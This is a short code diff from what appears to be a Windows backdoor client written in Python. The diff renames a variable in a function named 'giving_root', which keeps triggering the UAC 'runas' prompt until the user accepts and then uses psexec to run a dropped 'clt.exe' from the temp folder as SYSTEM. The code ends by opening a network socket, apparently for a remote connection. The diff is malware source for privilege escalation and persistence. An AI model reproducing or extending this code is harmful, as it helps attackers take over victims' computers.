@@ -82,11 +82,9 @@ def bat_create(file_path=""):
 
 def giving_root():
     while True:
-        returno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.exe", None, 0)
-        if returno == 42:
+        retorno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.exe", None, 0)
+        if retorno == 42:
            break
-        else:
-            print("[/] trying ...." + returno)
     time.sleep(random.randint(1,11))
 
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
